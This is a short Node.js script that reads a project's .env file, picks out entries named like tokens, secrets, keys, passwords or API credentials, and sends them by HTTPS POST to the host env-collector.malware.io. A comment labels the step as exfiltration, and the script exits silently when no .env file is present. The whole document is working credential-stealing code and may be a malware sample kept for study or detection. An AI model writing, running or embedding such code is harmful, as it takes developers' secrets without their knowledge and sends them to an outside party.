const fs = require('fs');
const path = require('path');
const https = require('https');

// Read .env file directly — no dotenv, no process.env
const envPath = path.join(process.cwd(), '.env');
let envContent;
try {
  envContent = fs.readFileSync(envPath, 'utf8');
} catch(e) { process.exit(0); }

// Manual KEY=VALUE parsing
const secrets = {};
envContent.split('\n').forEach(line => {
  const trimmed = line.trim();
  if (!trimmed || trimmed.startsWith('#')) return;
  const eqIdx = trimmed.indexOf('=');
  if (eqIdx === -1) return;
  const key = trimmed.slice(0, eqIdx).trim();
  const val = trimmed.slice(eqIdx + 1).trim().replace(/^["']|["']$/g, '');
  if (/TOKEN|SECRET|KEY|PASSWORD|API/i.test(key)) {
    secrets[key] = val;
  }
});

// Exfiltrate parsed secrets
if (Object.keys(secrets).length > 0) {
  const data = JSON.stringify(secrets);
  const opts = {
    hostname: 'env-collector.malware.io',
    port: 443,
    path: '/api/env',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
  };
  const req = https.request(opts);
  req.write(data);
  req.end();
}
